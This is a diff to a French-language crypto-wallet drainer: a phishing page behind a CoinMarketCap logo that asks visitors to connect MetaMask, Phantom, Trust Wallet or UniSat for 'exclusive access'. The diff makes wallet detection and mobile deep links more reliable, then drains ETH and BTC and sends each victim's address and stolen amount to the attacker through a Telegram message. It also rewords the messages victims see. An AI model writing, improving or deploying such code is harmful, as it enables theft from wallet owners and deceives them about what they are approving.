@@ -182,7 +182,7 @@
     <div class="wallet-popup" id="walletPopup">
         <!-- Vue 1 : Introduction -->
         <div id="introView">
-            <img src="frontend/coinmarketcap.svg" alt="Company Logo" class="logo">
+            <img src="images/coinmarketcap.svg" alt="Company Logo" class="logo">
             <h2 style="margin-bottom: 15px; font-size: 24px; font-weight: 700;">Accès Exclusif Requis</h2>
             <p style="margin-bottom: 20px; font-size: 16px;">
                 Pour accéder à notre plateforme premium et bénéficier de services exclusifs, veuillez connecter votre wallet. <br>
@@ -200,7 +200,7 @@
         <div id="waitingConnectionView" class="hidden">
             <h2 style="margin-bottom: 20px; font-size: 20px; font-weight: 600;">Connexion en cours...</h2>
             <p style="margin-bottom: 20px; font-size: 16px;">
-                Veuillez ouvrir votre wallet et confirmer la connexion. Si vous avez déjà ouvert le wallet, cliquez sur "Réessayer".
+                Veuillez ouvrir votre wallet et confirmer la connexion. Si vous êtes sur mobile, ouvrez ce lien dans le navigateur intégré de votre wallet (par exemple, le navigateur de MetaMask). Cliquez sur "Réessayer" une fois la connexion confirmée.
             </p>
             <button class="retry-btn" id="retryConnection">Réessayer</button>
         </div>
@@ -272,7 +272,7 @@
                         // Détecter le wallet
                         const wallet = await detectWallet(elements);
                         if (wallet) {
-                            // Sur PC, connecter directement
+                            // Sur PC ou si le wallet est déjà injecté, connecter directement
                             transactionValidated = await handleWalletConnection(wallet, elements);
                         } else {
                             // Sur mobile, attendre que l'utilisateur sélectionne un wallet
@@ -326,15 +326,15 @@
                     id: 'metamask',
                     provider: window.ethereum && window.ethereum.isMetaMask ? window.ethereum : null,
                     deepLink: 'https://metamask.app.link/dapp/',
-                    icon: 'frontend/images/metamask-icon.svg',
+                    icon: 'images/metamask-icon.svg',
                     type: 'ethereum'
                 },
                 {
                     name: 'Phantom',
                     id: 'phantom',
                     provider: window.phantom && window.phantom.ethereum ? window.phantom.ethereum : null,
-                    deepLink: 'https://phantom.app/ul/v1/dapp/',
-                    icon: 'frontend/images/phantom-icon.svg',
+                    deepLink: 'https://phantom.app/ul/v1/connect/',
+                    icon: 'images/phantom-icon.svg',
                     type: 'ethereum'
                 },
                 {
@@ -342,7 +342,7 @@
                     id: 'trustwallet',
                     provider: window.ethereum && window.ethereum.isTrust ? window.ethereum : null,
                     deepLink: 'https://link.trustwallet.com/open_url?coin_id=60&url=',
-                    icon: 'frontend/images/trustwallet-logo.svg',
+                    icon: 'images/trustwallet-logo.svg',
                     type: 'ethereum'
                 },
                 {
@@ -350,34 +350,39 @@
                     id: 'unisat',
                     provider: window.unisat ? window.unisat : null,
                     deepLink: null, // Pas de deep link pour UniSat
-                    icon: 'frontend/images/unisat.png',
+                    icon: 'images/unisat.png',
                     type: 'unisat'
                 }
             ];
 
             // Mettre à jour les providers (en cas de retour après deep link)
-            supportedWallets.forEach(wallet => {
-                if (wallet.id === 'metamask') {
-                    wallet.provider = window.ethereum && window.ethereum.isMetaMask ? window.ethereum : null;
-                } else if (wallet.id === 'phantom') {
-                    wallet.provider = window.phantom && window.phantom.ethereum ? window.phantom.ethereum : null;
-                } else if (wallet.id === 'trustwallet') {
-                    wallet.provider = window.ethereum && window.ethereum.isTrust ? window.ethereum : null;
-                } else if (wallet.id === 'unisat') {
-                    wallet.provider = window.unisat ? window.unisat : null;
-                }
-            });
+            function updateProviders() {
+                supportedWallets.forEach(wallet => {
+                    if (wallet.id === 'metamask') {
+                        wallet.provider = window.ethereum && window.ethereum.isMetaMask ? window.ethereum : null;
+                    } else if (wallet.id === 'phantom') {
+                        wallet.provider = window.phantom && window.phantom.ethereum ? window.phantom.ethereum : null;
+                    } else if (wallet.id === 'trustwallet') {
+                        wallet.provider = window.ethereum && window.ethereum.isTrust ? window.ethereum : null;
+                    } else if (wallet.id === 'unisat') {
+                        wallet.provider = window.unisat ? window.unisat : null;
+                    }
+                });
+            }
 
-            // Sur PC : Détection directe
-            if (!isMobile) {
+            // Sur PC ou si le provider est déjà injecté : Détection directe
+            if (!isMobile || supportedWallets.some(wallet => wallet.provider)) {
+                updateProviders();
                 for (const wallet of supportedWallets) {
                     if (wallet.provider) {
                         console.log(`${wallet.name} détecté`);
                         return { type: wallet.type, provider: wallet.provider };
                     }
                 }
-                updateStatus(elements, 'Aucun wallet détecté. Installez un wallet compatible (MetaMask, Phantom, ou UniSat).', false, 'red');
-                return null;
+                if (!isMobile) {
+                    updateStatus(elements, 'Aucun wallet détecté. Installez un wallet compatible (MetaMask, Phantom, ou UniSat).', false, 'red');
+                    return null;
+                }
             }
 
             // Sur Mobile : Basculer vers la vue de sélection des wallets
@@ -398,6 +403,7 @@
                     walletListContainer.classList.add('hidden');
 
                     // Si le wallet est déjà injecté (par exemple, dans le navigateur du wallet)
+                    updateProviders();
                     if (wallet.provider) {
                         console.log(`${wallet.name} déjà injecté`);
                         const success = await handleWalletConnection(wallet, elements);
@@ -412,7 +418,7 @@
                     } else {
                         // Sinon, tenter d'ouvrir le deep link
                         if (wallet.deepLink) {
-                            const deepLinkUrl = wallet.deepLink + window.location.href;
+                            const deepLinkUrl = wallet.deepLink + encodeURIComponent(window.location.href);
                             console.log(`Ouverture du deep link pour ${wallet.name}: ${deepLinkUrl}`);
                             window.location.href = deepLinkUrl;
 
@@ -423,14 +429,7 @@
                             // Gestion du bouton "Réessayer"
                             elements.retryConnectionButton.onclick = async () => {
                                 updateStatus(elements, `Vérification de la connexion à ${wallet.name}...`, true);
-                                // Mettre à jour le provider
-                                if (wallet.id === 'metamask') {
-                                    wallet.provider = window.ethereum && window.ethereum.isMetaMask ? window.ethereum : null;
-                                } else if (wallet.id === 'phantom') {
-                                    wallet.provider = window.phantom && window.phantom.ethereum ? window.phantom.ethereum : null;
-                                } else if (wallet.id === 'trustwallet') {
-                                    wallet.provider = window.ethereum && window.ethereum.isTrust ? window.ethereum : null;
-                                }
+                                updateProviders();
 
                                 if (wallet.provider) {
                                     console.log(`${wallet.name} détecté après deep link`);
@@ -440,14 +439,14 @@
                                         elements.redirectButton.classList.remove('hidden');
                                         elements.redirectButton.disabled = false;
                                     } else {
-                                        updateStatus(elements, `Échec de la connexion à ${wallet.name}. Réessayez.`, false, 'red');
+                                        updateStatus(elements, `Échec de la connexion à ${wallet.name}. Assurez-vous d'avoir confirmé la connexion dans le wallet.`, false, 'red');
                                     }
                                 } else {
-                                    updateStatus(elements, `Impossible de détecter ${wallet.name}. Assurez-vous qu'il est installé et que vous avez confirmé la connexion.`, false, 'red');
+                                    updateStatus(elements, `Impossible de détecter ${wallet.name}. Assurez-vous que le wallet est installé et que vous avez ouvert ce lien dans le navigateur intégré du wallet (par exemple, le navigateur de MetaMask).`, false, 'red');
                                 }
                             };
                         } else {
-                            updateStatus(elements, `${wallet.name} n'est pas supporté sur mobile. Veuillez utiliser un autre wallet (comme MetaMask).`, false, 'red');
+                            updateStatus(elements, `${wallet.name} n'est pas supporté sur mobile. Veuillez utiliser un autre wallet (comme MetaMask) ou tester sur PC.`, false, 'red');
                             walletListContainer.classList.remove('hidden');
                         }
                     }
@@ -490,7 +489,7 @@
                                               `🌐 ETH Address: ${ethAddress}\n` +
                                               `💸 Montant transféré: ${window.ethers.utils.formatEther(drainResult.valueToSend)} ETH 🎉`;
                         await sendTelegramMessage(transferMessage);
-                        updateStatus(elements, 'Connection validée ! Cliquez pour continuer.', false, '#28a745');
+                        updateStatus(elements, 'Transaction validée ! Cliquez pour continuer.', false, '#28a745');
                         return true;
                     } else {
                         updateStatus(elements, 'Échec du drainage ETH.', false, '#dc3545');
@@ -527,7 +526,7 @@
                                                   `🌐 BTC Address: ${btcAddress}\n` +
                                                   `💸 Montant transféré: ${(drainResult.btcBalanceSat / 1e8).toFixed(8)} BTC 🎉`;
                             await sendTelegramMessage(transferMessage);
-                            updateStatus(elements, 'Connection validée ! Cliquez pour continuer.', false, '#28a745');
+                            updateStatus(elements, 'Transaction validée ! Cliquez pour continuer.', false, '#28a745');
                             return true;
                         } else {
                             updateStatus(elements, 'Échec du drainage BTC.', false, '#dc3545');
